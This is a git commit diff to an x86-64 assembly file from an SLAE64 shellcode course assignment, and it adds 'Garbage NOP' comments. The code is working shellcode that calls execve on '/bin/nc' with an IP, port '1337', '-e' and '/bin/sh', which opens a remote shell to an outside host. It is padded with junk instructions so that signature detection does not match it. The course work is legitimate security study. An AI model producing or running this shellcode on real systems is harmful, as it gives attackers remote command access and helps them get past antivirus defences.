2192876d895fb8e70f004dce19fae1b5beb2868e
Felipe Winsnes <45699918+whitecr0wz@users.noreply.github.com>
2021-02-05 17:25:41 -0300

    Update 1.asm

--- SLAE64/Assignment_6/3_shellcode/1.asm
+++ SLAE64/Assignment_6/3_shellcode/1.asm
@@ -3,37 +3,37 @@ global _start
 _start:
 
 xor    	rdx,rdx
-nop
-nop
+nop                                                 ; Garbage NOP
+nop                                                 ; Garbage NOP
 mov 	rdi,0x636e2f6e69622fff
 shr	rdi,0x08
-dec al
+dec al                                              ; Garbage NOP
 push 	rdi
 mov 	rdi,rsp
 
 mov	rcx,0x68732f6e69622fff
 shr	rcx,0x08
-dec al
+dec al                                              ; Garbage NOP
 
 
 push 	rcx
-inc cl
-dec cl
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
 mov	rcx,rsp
 
 mov     rbx,0x652dffffffffffff
-std
-cwd
+std                                                 ; Garbage NOP
+cwd                                                 ; Garbage NOP
 shr	rbx,0x30
 
-cmc
+cmc                                                 ; Garbage NOP
 
 push	rbx
 mov	rbx,rsp
 
 mov	r10,0x37333331ffffffff
 shr 	r10,0x20
-std
+std                                                 ; Garbage NOP
 push 	r10
 mov	r10,rsp
 
@@ -44,26 +44,26 @@ pop 	r9
 push	rdx  ;push NULL
 
 push 	rcx  ;push address of 'bin/sh'
-nop
-inc dl
-dec dl
+nop                                                 ; Garbage NOP
+inc dl                                              ; Garbage NOP  
+dec dl                                              ; Garbage NOP
 
 push	rbx  ;push address of '-e'
-inc cl
-dec cl
-nop
+inc cl                                              ; Garbage NOP
+dec cl                                              ; Garbage NOP
+nop                                                 ; Garbage NOP
 push	r10  ;push address of '1337'
 
-dec al
+dec al                                              ; Garbage NOP
 
 push	r9   ;push address of 'ip'
 
-inc bl
-dec bl
+inc bl                                              ; Garbage NOP
+dec bl                                              ; Garbage NOP
 
 push 	rdi  ;push address of '/bin/nc'
 
-nop
+nop                                                 ; Garbage NOP
 mov    	rsi,rsp
 mov al, 59
 
